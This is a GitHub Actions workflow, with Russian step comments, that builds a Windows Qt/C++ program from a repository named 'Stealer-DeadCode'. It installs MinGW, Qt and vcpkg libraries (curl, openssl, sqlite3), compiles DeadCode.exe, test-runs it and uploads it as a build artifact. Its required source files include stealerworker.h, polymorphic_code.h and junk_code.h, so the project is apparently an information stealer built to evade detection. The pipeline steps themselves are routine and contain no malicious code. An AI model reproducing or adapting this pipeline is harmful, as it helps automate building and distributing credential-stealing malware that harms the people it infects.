name: Build DeadCode

on:
  push:
    branches:
      - main
  workflow_dispatch:
    inputs:
      cache-buster:
        description: 'Cache buster'
        default: '1'

jobs:
  build-windows:
    runs-on: windows-latest
    timeout-minutes: 120

    steps:
    # Шаг 1: Клонирование репозитория
    - name: Checkout repository
      uses: actions/checkout@v4
      with:
        path: Stealer-DeadCode
        fetch-depth: 0

    # Шаг 2: Установка Python
    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.11'

    # Шаг 3: Установка зависимостей Python для aqtinstall
    - name: Install Python dependencies for aqtinstall
      run: |
        Write-Host "Installing Python dependencies for aqtinstall..."
        python -m pip install --upgrade pip setuptools wheel
        python -m pip install py7zr aqtinstall requests beautifulsoup4
        python -m aqt version
      shell: powershell

    # Шаг 4: Проверка доступных архитектур Qt
    - name: Check available Qt architectures
      run: |
        Write-Host "Checking available architectures for Qt 5.15.2..."
        python -m aqt list-qt windows desktop --arch 5.15.2
      shell: powershell

    # Шаг 5: Проверка дискового пространства
    - name: Check disk space
      run: |
        Write-Host "Checking available disk space..."
        Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" | Select-Object DeviceID, @{Name="FreeSpace(GB)";Expression={[math]::Round($_.FreeSpace/1GB,2)}}
      shell: powershell

    # Шаг 6: Кэширование MSYS2
    - name: Cache MSYS2
      uses: actions/cache@v4
      with:
        path: C:/tools/msys64
        key: msys2-${{ runner.os }}-20240727-${{ github.event.inputs.cache-buster || '1' }}
        restore-keys: |
          msys2-${{ runner.os }}-20240727-

    # Шаг 7: Установка MSYS2 и MinGW
    - name: Install MinGW via MSYS2
      run: |
        Write-Host "Installing MSYS2 and MinGW..."
        $attempts = 3
        $success = $false

        if (Test-Path "C:/tools/msys64/usr/bin/bash.exe") {
          Write-Host "MSYS2 already exists at C:/tools/msys64. Skipping installation."
          $success = $true
        } else {
          Write-Host "MSYS2 not found. Attempting to install via Chocolatey..."
          for ($i = 1; $i -le $attempts; $i++) {
            Write-Host "Attempt $i/$attempts : Installing MSYS2 via Chocolatey..."
            choco install msys2 --version 20240727.0.0 -y --timeout 1200 --params "/NoUpdate /InstallDir:C:/tools/msys64"
            $exitCode = $LASTEXITCODE
            if ($exitCode -eq 0 -or $exitCode -eq 3010) {
              Write-Host "MSYS2 installed successfully via Chocolatey."
              $success = $true
              break
            } else {
              Write-Host "Attempt $i/$attempts : Failed to install MSYS2 (exit code: $exitCode)"
              if ($i -eq $attempts) {
                Write-Host "Chocolatey installation failed. Attempting direct download..."
                Invoke-WebRequest -Uri "https://github.com/msys2/msys2-installer/releases/download/2024-07-27/msys2-x86_64-20240727.exe" -OutFile "msys2-installer.exe"
                Start-Process -FilePath "msys2-installer.exe" -ArgumentList "--accept-licenses --accept-messages --root C:/tools/msys64" -Wait
                if (Test-Path "C:/tools/msys64/usr/bin/bash.exe") {
                  Write-Host "MSYS2 installed successfully via direct download."
                  $success = $true
                } else {
                  Write-Host "Error: MSYS2 installation failed via direct download."
                  exit 1
                }
              }
              Start-Sleep -Seconds 10
            }
          }
        }

        if (-not $success) {
          Write-Host "Error: MSYS2 installation failed after all attempts."
          exit 1
        }

        Write-Host "Updating MSYS2 and installing MinGW..."
        C:/tools/msys64/usr/bin/bash.exe -lc "pacman -Syu --noconfirm --disable-download-timeout"
        C:/tools/msys64/usr/bin/bash.exe -lc "pacman -Su --noconfirm --disable-download-timeout"
        C:/tools/msys64/usr/bin/bash.exe -lc "pacman -S --noconfirm --disable-download-timeout mingw-w64-x86_64-gcc mingw-w64-x86_64-make"

        Write-Host "Adding MinGW to PATH..."
        $env:Path = "C:/tools/msys64/mingw64/bin;" + $env:Path
        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)

        Write-Host "Verifying MinGW installation..."
        g++ --version
        mingw32-make --version
      shell: powershell

    # Шаг 8: Установка Perl (требуется для Qt)
    - name: Install Perl (required for Qt)
      run: |
        Write-Host "Installing Perl via Chocolatey..."
        choco install strawberryperl -y --force --timeout 600
        refreshenv
      shell: powershell

    # Шаг 9: Кэширование Qt
    - name: Cache Qt
      uses: actions/cache@v4
      with:
        path: C:/Qt
        key: qt-5.15.2-${{ runner.os }}-mingw81_64-${{ github.event.inputs.cache-buster || '1' }}
        restore-keys: |
          qt-5.15.2-${{ runner.os }}-mingw81_64-

    # Шаг 10: Установка Qt 5.15.2 через aqtinstall
    - name: Install Qt 5.15.2 via aqtinstall
      run: |
        Write-Host "Installing Qt 5.15.2 with MinGW 8.1..."
        python -m aqt install-qt windows desktop 5.15.2 win64_mingw81 -O C:/Qt --archives qtbase qttools qtsvg qtdeclarative qtquickcontrols qtquickcontrols2 qtgraphicaleffects qtimageformats qtsql qtquick qtquicktimeline qtquick3d qtwinextras
        Write-Host "Qt installation completed."
      shell: powershell

    # Шаг 11: Проверка установки Qt
    - name: Verify Qt installation
      run: |
        Write-Host "Verifying Qt installation..."
        $env:Path = "C:/tools/msys64/mingw64/bin;C:/Qt/5.15.2/mingw81_64/bin;" + $env:Path
        & "C:/Qt/5.15.2/mingw81_64/bin/qmake.exe" --version
        Write-Host "Qt installation verified."
      shell: powershell

    # Шаг 12: Кэширование vcpkg
    - name: Cache vcpkg
      uses: actions/cache@v4
      with:
        path: C:/vcpkg
        key: vcpkg-${{ hashFiles('**/vcpkg.json') }}-${{ github.event.inputs.cache-buster || '1' }}
        restore-keys: |
          vcpkg-

    # Шаг 13: Установка vcpkg и зависимостей
    - name: Install vcpkg and dependencies
      run: |
        if (-not (Test-Path C:/vcpkg)) {
          Write-Host "Cloning vcpkg..."
          git clone https://github.com/microsoft/vcpkg.git C:/vcpkg
        }
        Write-Host "Running bootstrap-vcpkg..."
        & C:/vcpkg/bootstrap-vcpkg.bat -disableMetrics
        $env:Path = "C:/vcpkg;" + $env:Path
        Write-Host "Installing vcpkg dependencies..."
        & C:/vcpkg/vcpkg.exe install sqlite3 libzip zlib bzip2 curl openssl --triplet x64-mingw-static --clean-after-build 2>&1 | Tee-Object -FilePath "Stealer-DeadCode/vcpkg_install.log"
        Write-Host "vcpkg installation completed successfully."
      shell: powershell

    # Шаг 14: Проверка установки vcpkg
    - name: Verify vcpkg installation
      run: |
        $libDir = "C:/vcpkg/installed/x64-mingw-static/lib"
        $includeDir = "C:/vcpkg/installed/x64-mingw-static/include"
        $libs = @("libsqlite3.a", "libzip.a", "libzlib.a", "libbz2.a", "libcurl.a", "libssl.a", "libcrypto.a")
        $headers = @("sqlite3.h", "zip.h", "zlib.h", "bzlib.h", "curl/curl.h", "openssl/ssl.h", "openssl/crypto.h")
        $missing = @()
        foreach ($lib in $libs) {
          if (-not (Test-Path "$libDir/$lib")) {
            $missing += "$lib"
          }
        }
        foreach ($header in $headers) {
          if (-not (Test-Path "$includeDir/$header")) {
            $missing += $header
          }
        }
        if ($missing) {
          Write-Host "Error: Missing libraries or header files: $missing"
          dir $libDir
          dir $includeDir
          exit 1
        }
        Write-Host "All vcpkg dependencies verified as static."
      shell: powershell

    # Шаг 15: Проверка структуры проекта
    - name: Verify project structure
      run: |
        Set-Location -Path Stealer-DeadCode
        $requiredFiles = @(
          "ui/DeadCode.pro",
          "src/main.cpp",
          "ui/mainwindow.ui",
          "ui/mainwindow.cpp",
          "ui/mainwindow.h",
          "src/build_key.h",
          "src/polymorphic_code.h",
          "src/junk_code.h",
          "src/stealerworker.h",
          "icon.rc",
          "icon.ico"
        )
        $missingFiles = @()
        foreach ($file in $requiredFiles) {
          if (-not (Test-Path $file)) {
            $missingFiles += $file
          }
        }
        if ($missingFiles) {
          Write-Host "Error: Missing required files: $missingFiles"
          exit 1
        }
        New-Item -Path build -ItemType Directory -Force
        New-Item -Path build/release -ItemType Directory -Force
        Write-Host "Project structure verified."
      shell: powershell

    # Шаг 16: Исправление кодировки icon.rc
    - name: Fix icon.rc encoding
      run: |
        Set-Location -Path Stealer-DeadCode
        Write-Host "Fixing encoding of icon.rc..."
        $content = Get-Content -Path icon.rc -Raw -Encoding UTF8
        Set-Content -Path icon.rc -Value $content -NoNewline -Encoding ASCII
        Write-Host "icon.rc encoding fixed to ASCII."
      shell: powershell

    # Шаг 17: Генерация UI-файлов
    - name: Generate UI files
      run: |
        Set-Location -Path Stealer-DeadCode
        Write-Host "Generating ui_mainwindow.h..."
        & "C:/Qt/5.15.2/mingw81_64/bin/uic.exe" ui/mainwindow.ui -o build/release/ui_mainwindow.h
        if (-not (Test-Path build/release/ui_mainwindow.h)) {
          Write-Host "Error: ui_mainwindow.h was not generated."
          exit 1
        }
        Write-Host "ui_mainwindow.h generated successfully."
      shell: powershell

    # Шаг 18: Конфигурация и сборка проекта
    - name: Configure and build
      run: |
        Set-Location -Path Stealer-DeadCode
        $env:TEMP = "C:/Temp"
        $env:TMP = "C:/Temp"
        New-Item -Path $env:TEMP -ItemType Directory -Force
        $env:Path = "C:/Qt/5.15.2/mingw81_64/bin;C:/vcpkg;C:/tools/msys64/mingw64/bin;" + $env:Path
        $env:QML2_IMPORT_PATH = "C:/Qt/5.15.2/mingw81_64/qml"

        $buildDate = Get-Date -Format "yyyy-MM-dd"
        $buildVersion = git rev-parse --short HEAD
        if (-not $buildVersion) { $buildVersion = "unknown" }
        Write-Host "Build Date: $buildDate"
        Write-Host "Build Version: $buildVersion"

        Set-Location -Path build
        & "C:/Qt/5.15.2/mingw81_64/bin/qmake.exe" "../ui/DeadCode.pro" "CONFIG+=release" "QMAKE_CXXFLAGS+=-Wno-attributes" "DEFINES+=BUILD_DATE=`"$buildDate`"" "DEFINES+=BUILD_VERSION=`"$buildVersion`"" 2>&1 | Tee-Object -FilePath "../qmake_output.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: qmake failed. Check qmake_output.log"
          Get-Content ../qmake_output.log
          exit 1
        }

        & "C:/tools/msys64/mingw64/bin/mingw32-make.exe" -f Makefile.Release -j1 2>&1 | Tee-Object -FilePath "../make_output.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: mingw32-make failed. Check make_output.log"
          Get-Content ../make_output.log
          exit 1
        }

        if (-not (Test-Path release/DeadCode.exe)) {
          Write-Host "Error: DeadCode.exe was not generated."
          exit 1
        }
        Write-Host "Build completed successfully."
      shell: powershell

    # Шаг 19: Проверка зависимостей DeadCode.exe
    - name: Check DeadCode.exe dependencies
      run: |
        Set-Location -Path Stealer-DeadCode/build/release
        Write-Host "Checking dependencies of DeadCode.exe..."
        $env:Path += ";C:/tools/msys64/mingw64/bin"
        $objdump = "C:/tools/msys64/mingw64/bin/objdump.exe"
        if (-not (Test-Path $objdump)) {
          Write-Host "Error: objdump.exe not found at $objdump"
          exit 1
        }
        & $objdump -p DeadCode.exe | Select-String "DLL Name" > dependencies.txt
        if (Test-Path dependencies.txt) {
          Write-Host "Dependencies of DeadCode.exe:"
          Get-Content dependencies.txt
        } else {
          Write-Host "No dependencies found or objdump failed."
          exit 1
        }
      shell: powershell

    # Шаг 20: Копирование всех Qt DLL, плагинов и QML-модулей
    - name: Copy all Qt DLLs, plugins, and QML modules
      run: |
        Set-Location -Path Stealer-DeadCode/build/release
        $qtBinDir = "C:/Qt/5.15.2/mingw81_64/bin"
        $qtPluginsDir = "C:/Qt/5.15.2/mingw81_64/plugins"
        $qtQmlDir = "C:/Qt/5.15.2/mingw81_64/qml"
        $mingwBinDir = "C:/tools/msys64/mingw64/bin"

        # Копирование всех Qt DLL
        Write-Host "Copying all Qt DLLs from $qtBinDir..."
        if (Test-Path "$qtBinDir") {
          Copy-Item -Path "$qtBinDir/*.dll" -Destination ./
          Write-Host "Copied all Qt DLLs"
        } else {
          Write-Host "Error: Qt bin directory not found at $qtBinDir"
          exit 1
        }

        # Копирование всех MinGW DLL
        Write-Host "Copying all MinGW DLLs from $mingwBinDir..."
        if (Test-Path "$mingwBinDir") {
          Copy-Item -Path "$mingwBinDir/*.dll" -Destination ./
          Write-Host "Copied all MinGW DLLs"
        } else {
          Write-Host "Error: MinGW bin directory not found at $mingwBinDir"
          exit 1
        }

        # Проверка наличия ключевых DLL
        $keyDlls = @(
          "Qt5Core.dll",
          "Qt5Gui.dll",
          "Qt5Network.dll",
          "Qt5Widgets.dll",
          "Qt5Qml.dll",
          "Qt5Quick.dll",
          "libwinpthread-1.dll",
          "libgcc_s_seh-1.dll",
          "libstdc++-6.dll"
        )
        $missingKeyDlls = @()
        foreach ($dll in $keyDlls) {
          if (-not (Test-Path "./$dll")) {
            $missingKeyDlls += $dll
          }
        }
        if ($missingKeyDlls) {
          Write-Host "Error: The following key DLLs are missing in the release directory: $missingKeyDlls"
          exit 1
        }

        # Копирование всех Qt плагинов
        Write-Host "Copying all Qt plugins from $qtPluginsDir..."
        if (Test-Path "$qtPluginsDir") {
          $pluginDirs = @(
            "platforms",
            "sqldrivers",
            "imageformats",
            "styles",
            "qmltooling",
            "quick",
            "iconengines",
            "audio",
            "bearer",
            "generic",
            "mediaservice",
            "printsupport",
            "texttospeech"
          )
          foreach ($pluginDir in $pluginDirs) {
            if (Test-Path "$qtPluginsDir/$pluginDir") {
              New-Item -Path "$pluginDir" -ItemType Directory -Force
              Copy-Item -Path "$qtPluginsDir/$pluginDir/*.dll" -Destination "$pluginDir/" -ErrorAction SilentlyContinue
              Write-Host "Copied Qt plugins from $pluginDir"
            } else {
              Write-Host "Warning: Qt plugin directory $pluginDir not found in $qtPluginsDir"
            }
          }
        } else {
          Write-Host "Error: Qt plugins directory not found at $qtPluginsDir"
          exit 1
        }

        # Проверка наличия ключевых плагинов
        $keyPlugins = @(
          "platforms/qwindows.dll",
          "sqldrivers/qsqlite.dll"
        )
        $missingKeyPlugins = @()
        foreach ($plugin in $keyPlugins) {
          if (-not (Test-Path $plugin)) {
            $missingKeyPlugins += $plugin
          }
        }
        if ($missingKeyPlugins) {
          Write-Host "Error: The following key plugins are missing: $missingKeyPlugins"
          exit 1
        }

        # Копирование всех QML-модулей
        Write-Host "Copying all QML modules from $qtQmlDir..."
        if (Test-Path "$qtQmlDir") {
          $qmlModules = Get-ChildItem -Path "$qtQmlDir" -Directory | ForEach-Object { $_.Name }
          foreach ($module in $qmlModules) {
            New-Item -Path "$module" -ItemType Directory -Force
            Copy-Item -Path "$qtQmlDir/$module/*" -Destination "$module/" -Recurse -ErrorAction SilentlyContinue
            Write-Host "Copied QML module $module"
          }
        } else {
          Write-Host "Error: QML directory not found at $qtQmlDir"
          exit 1
        }

        # Логирование содержимого release
        Write-Host "Contents of release directory:"
        dir .
        dir platforms -ErrorAction SilentlyContinue
        dir sqldrivers -ErrorAction SilentlyContinue
        dir imageformats -ErrorAction SilentlyContinue
        dir styles -ErrorAction SilentlyContinue
        dir qmltooling -ErrorAction SilentlyContinue
        dir quick -ErrorAction SilentlyContinue
      shell: powershell

    # Шаг 21: Проверка соответствия зависимостей
    - name: Verify dependencies are copied
      run: |
        Set-Location -Path Stealer-DeadCode/build/release
        Write-Host "Verifying that all required DLLs are copied..."
        $dependencies = Get-Content dependencies.txt | ForEach-Object { if ($_ -match "DLL Name: (.*)") { $matches[1] } }
        $missingDlls = @()
        foreach ($dll in $dependencies) {
          if (-not (Test-Path $dll) -and $dll -notlike "api-ms-win-*" -and $dll -notlike "KERNEL32.dll" -and $dll -notlike "USER32.dll" -and $dll -notlike "SHELL32.dll") {
            $missingDlls += $dll
          }
        }
        if ($missingDlls) {
          Write-Host "Error: The following required DLLs are missing in the release directory: $missingDlls"
          exit 1
        }
        Write-Host "All required DLLs are present."
      shell: powershell

    # Шаг 22: Тестирование запуска DeadCode.exe
    - name: Test run DeadCode.exe
      run: |
        Set-Location -Path Stealer-DeadCode/build/release
        $env:QT_LOGGING_RULES = "qml.debug=true"
        $env:QML2_IMPORT_PATH = "C:/Qt/5.15.2/mingw81_64/qml;."
        $env:Path = "C:/Qt/5.15.2/mingw81_64/bin;C:/tools/msys64/mingw64/bin;" + $env:Path
        Start-Process -FilePath "DeadCode.exe" -NoNewWindow -Wait -RedirectStandardOutput "deadcode_output.log" -RedirectStandardError "deadcode_error.log"
        Write-Host "DeadCode.exe executed. Output:"
        Get-Content "deadcode_output.log" -ErrorAction SilentlyContinue
        Write-Host "Errors:"
        Get-Content "deadcode_error.log" -ErrorAction SilentlyContinue
      shell: powershell

    # Шаг 23: Загрузка логов в случае ошибки
    - name: Upload build logs
      if: failure()
      uses: actions/upload-artifact@v4
      with:
        name: build-logs
        path: |
          Stealer-DeadCode/qmake_output.log
          Stealer-DeadCode/make_output.log
          Stealer-DeadCode/vcpkg_install.log
          Stealer-DeadCode/build/release/deadcode_output.log
          Stealer-DeadCode/build/release/deadcode_error.log
          Stealer-DeadCode/build/release/dependencies.txt
        if-no-files-found: warn

    # Шаг 24: Загрузка артефакта
    - name: Upload artifact
      uses: actions/upload-artifact@v4
      with:
        name: DeadCode-Build
        path: |
          Stealer-DeadCode/build/release/DeadCode.exe
          Stealer-DeadCode/build/release/*.dll
          Stealer-DeadCode/build/release/platforms/*
          Stealer-DeadCode/build/release/sqldrivers/*
          Stealer-DeadCode/build/release/imageformats/*
          Stealer-DeadCode/build/release/styles/*
          Stealer-DeadCode/build/release/qmltooling/*
          Stealer-DeadCode/build/release/quick/*
          Stealer-DeadCode/build/release/iconengines/*
          Stealer-DeadCode/build/release/audio/*
          Stealer-DeadCode/build/release/bearer/*
          Stealer-DeadCode/build/release/generic/*
          Stealer-DeadCode/build/release/mediaservice/*
          Stealer-DeadCode/build/release/printsupport/*
          Stealer-DeadCode/build/release/texttospeech/*
          Stealer-DeadCode/build/release/**/*
        if-no-files-found: error

    # Шаг 25: Очистка
    - name: Cleanup
      if: always()
      run: |
        Remove-Item -Path "Stealer-DeadCode/build" -Recurse -Force -ErrorAction SilentlyContinue
      shell: powershell